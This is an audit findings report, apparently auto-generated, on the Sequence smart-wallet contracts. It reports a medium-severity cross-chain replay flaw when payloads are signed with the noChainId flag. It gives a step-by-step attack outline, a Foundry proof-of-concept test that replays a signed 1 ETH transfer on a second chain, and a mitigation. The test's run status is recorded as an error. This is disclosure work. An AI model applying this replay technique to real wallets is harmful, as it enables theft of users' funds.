# 2025 10 sequence - Findings Report
## Commit hash: b0e5fb15bf6735ec9aaba02f5eca28a7882d815d

##Findings by Pattern


 **Derived From** : Cross-chain actor exploiting noChainId configurations

[M-1]. Cross-Chain Execution Replay via NoChainId Payloads
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 0
- M: 1
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Cross-chain actor exploiting noChainId configurations

## [M-1]. Cross-Chain Execution Replay via NoChainId Payloads

### Finding Severity Justification: The finding identifies a violation of the 'Domain-Separated Signatures' invariant provided in the scope, which explicitly states that signatures are network-specific and cannot be replayed. The implementation allows the 'noChainId' flag to be used with transaction payloads (including value transfers), permitting cross-chain replay if the user signs such a payload. Although the user must sign the chain-agnostic hash, the protocol's failure to enforce its stated invariant (that signatures cannot be replayed) constitutes a valid vulnerability, exposing users to unintended execution across chains.
## Derived From Pattern/Invariant
Cross-chain actor exploiting noChainId configurations

## Exploit Type
ReplayAttack

## Location
Payload.sol.domainSeparator

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Payload.sol` library allows constructing a domain separator with `chainId` set to 0 if the `noChainId` flag is present in the `Decoded` payload. This feature allows users to sign transactions that are valid on any chain where the wallet is deployed with the same configuration (imageHash). A malicious actor can observe a `noChainId` signed transaction intended for Chain A and replay it on Chain B, executing the same operation (e.g., token transfer) unintendedly on the second chain.

## Impact
Direct theft of funds or unauthorized state changes on secondary chains. If a user manages funds on multiple chains with the same wallet address and signs a chain-agnostic transaction, they are vulnerable to replay attacks across all supported chains.

## Command to Run Test


## Proof of Concept
1. User holds 100 USDC on Chain A and Chain B.
2. User signs a `noChainId` payload to 'Transfer 100 USDC to Alice' intended for Chain A.
3. Attacker captures the payload and signature.
4. Attacker submits the same payload and signature to the wallet on Chain B.
5. `Payload.domainSeparator` uses 0 for chainId on both chains.
6. Signature validates, funds are transferred on Chain B unintendedly.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import { Stage2Module } from "src/Stage2Module.sol";
import { Payload } from "src/modules/Payload.sol";
import { Storage } from "src/modules/Storage.sol";
import { LibOptim } from "src/utils/LibOptim.sol";

// Harness to allow setting storage directly for testing purposes
contract WalletHarness is Stage2Module {
    constructor(address entryPoint) Stage2Module(entryPoint) {}

    function setKnownImageHash(bytes32 _imageHash) public {
        // keccak256("org.arcadeum.module.auth.upgradable.image.hash")
        bytes32 IMAGE_HASH_KEY = bytes32(0xea7157fa25e3aa17d0ae2d5280fa4e24d421c61842aa85e45194e1145aa72bf8);
        Storage.writeBytes32(IMAGE_HASH_KEY, _imageHash);
    }

    receive() external payable {}
}

contract CrossChainReplayTest is Test {
    WalletHarness wallet;
    uint256 signerPk = 0xA11CE;
    address signer;

    function setUp() public {
        signer = vm.addr(signerPk);
        wallet = new WalletHarness(address(0));
        vm.deal(address(wallet), 10 ether);

        // 1. Setup Wallet Configuration (Signer Weight 1, Threshold 1)
        // Leaf = keccak256("Sequence signer:\n", address, weight)
        bytes32 leaf = keccak256(abi.encodePacked("Sequence signer:\n", signer, uint256(1)));
        
        // BaseSig recovers the tree. For a single signer, root = leaf.
        // Then it hashes with threshold, checkpoint, and checkpointer to get imageHash.
        bytes32 root = leaf;
        uint256 threshold = 1;
        uint256 checkpoint = 0;
        address checkpointer = address(0);

        bytes32 imageHash = LibOptim.fkeccak256(root, bytes32(threshold));
        imageHash = LibOptim.fkeccak256(imageHash, bytes32(checkpoint));
        imageHash = LibOptim.fkeccak256(imageHash, bytes32(uint256(uint160(checkpointer))));

        wallet.setKnownImageHash(imageHash);
    }

    function testCrossChainReplay() public {
        address recipient = address(0xCAFE);
        uint256 amount = 1 ether;

        // 2. Construct Payload (Send 1 ETH)
        // Packed encoding: Global(0x11: space=0, singleCall=1) | CallFlags(0x02: val=1) | Addr | Val
        bytes memory packedPayload = abi.encodePacked(
            uint8(0x11),
            uint8(0x02),
            recipient,
            amount
        );

        // 3. Construct Digest to Sign
        // We manually reconstruct the Decoded struct to calculate the hash
        Payload.Call[] memory calls = new Payload.Call[](1);
        calls[0] = Payload.Call(recipient, amount, "", 0, false, false, 0);
        
        Payload.Decoded memory decoded = Payload.Decoded({
            kind: Payload.KIND_TRANSACTIONS,
            noChainId: true, // <--- VULNERABILITY: User signs with noChainId
            calls: calls,
            space: 0,
            nonce: 0,
            message: "",
            imageHash: bytes32(0),
            digest: bytes32(0),
            parentWallets: new address[](0)
        });

        // Hash uses chainId=0 due to noChainId=true
        bytes32 digest = Payload.hashFor(decoded, address(wallet));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);

        // 4. Construct Signature
        // Convert to ERC2098 Compact (r, vs)
        bytes32 vs = s;
        if (v == 28) vs = s | bytes32(uint256(1) << 255);
        
        // Sig Flag: 0x02 (noChainId=true, thresholdSize=1byte, checkpointSize=0)
        // Threshold: 0x01
        // Branch: 0x01 (Flag 0=Hash | Weight 1)
        bytes memory signature = abi.encodePacked(
            uint8(0x02), 
            uint8(0x01),
            uint8(0x01),
            r, vs
        );

        // 5. Execute on Chain A (ID: 1)
        vm.chainId(1);
        wallet.execute(packedPayload, signature);
        assertEq(recipient.balance, 1 ether, "Transfer failed on Chain A");

        // 6. Replay on Chain B (ID: 1337)
        // Since nonce is 0 on both chains and signature ignores chainId, this succeeds.
        vm.deal(recipient, 0);
        vm.chainId(1337);
        wallet.execute(packedPayload, signature);
        assertEq(recipient.balance, 1 ether, "Replay failed on Chain B");
    }
}

## Suggested Mitigation
Modify `BaseSig.recover` to explicitly forbid `noChainId` when the payload kind is `KIND_TRANSACTIONS`. This ensures transactions are always bound to the specific chain ID, while still allowing `noChainId` for config updates or messages if intended.

```solidity
// In BaseSig.sol

function recover(...) internal view returns (...) {
    // ... existing code ...

    // If the signature type is 10 we do a no chain id signature
    _payload.noChainId = signatureFlag & 0x02 == 0x02;

    // MITIGATION: Disallow noChainId for transactions
    if (_payload.noChainId && _payload.kind == Payload.KIND_TRANSACTIONS) {
        revert("BaseSig: noChainId forbidden for transactions");
    }

    // ... existing code ...
}
```



